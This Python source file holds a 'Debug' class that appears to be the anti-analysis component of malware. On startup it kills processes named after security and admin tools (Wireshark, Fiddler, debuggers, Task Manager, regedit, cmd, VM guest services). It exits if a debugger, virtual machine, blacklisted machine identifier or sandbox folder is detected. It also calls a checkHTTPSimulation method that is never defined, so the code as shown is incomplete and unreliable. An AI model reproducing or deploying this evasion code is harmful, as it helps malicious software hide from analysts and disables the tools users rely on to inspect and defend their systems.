import os
import psutil
import random
import requests
import subprocess
import sys

class Debug:
	def __init__(self):
		self.blacklisted_users = {
			''
		}
		self.blacklisted_pc_names = {
			''
		}
		self.blacklisted_uuids = {
			''}
		self.blacklisted_ips = {
			''}
		self.blacklisted_macs = {
			''}
		self.blacklisted_processes = {
			"httpdebuggerui", "wireshark", "fiddler", "regedit", "cmd", "taskmgr", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64",
			"ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga",
			"joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver"}
		self.blacklisted_video_controllers = ["virtualbox", "vmware", "qemu", "parallels", "microsoft basic display adapter","microsoft hyper-v-video",
							"microsoft remote display adapter", "onrf_d", "pcwmg1n_e", "y9696y"]

		if self.checks():
			os._exit(0)

	def checks(self):
		return (
			self.check_process() or
			self.get_network() or
			self.get_system() or
			self.checkHTTPSimulation() or
			self.checkVideoController()
		)

	def check_process(self) -> bool:
		for proc in psutil.process_iter(["name","pid"]):
			if any(procstr in proc.name().lower() for procstr in self.blacklisted_processes):
				try:
					psutil.Process(proc.pid).kill()
				except (psutil.NoSuchProcess, psutil.AccessDenied):
					pass
		if sys.gettrace():
			os._exit(0)

	def get_network(self) -> bool:
		try:
			network_interfaces = psutil.net_if_addrs()
			for _, addresses in network_interfaces.items():
				for address in addresses:
					if address.address in self.blacklisted_ips or address.address in self.blacklisted_macs:
						return True
		except Exception:
			pass
		return False

	def get_system(self) -> bool:
		try:
			if os.getenv('USERNAME').lower() in self.blacklisted_users or os.getenv('COMPUTERNAME').lower() in self.blacklisted_pc_names:
				return True
			with subprocess.Popen("wmic csproduct get uuid", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) as p:
				uuid = p.stdout.read().decode('utf-8').strip().split('\n')[1].strip()
				if uuid.lower() in self.blacklisted_uuids:
					return True
		except Exception:
			pass
		return False
	
	def checkVideoController(self) -> bool:
		with subprocess.Popen("wmic path win32_VideoController get name", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) as p:
			video_controller = p.stdout.read().decode('utf-8').lower()
		r1 = any(controller in video_controller for controller in self.blacklisted_video_controllers)
		r2 = any([os.path.isdir(path) for path in ('D:\\Tools', 'D:\\OS2', 'D:\\NT3X')])
		return r1 or r2
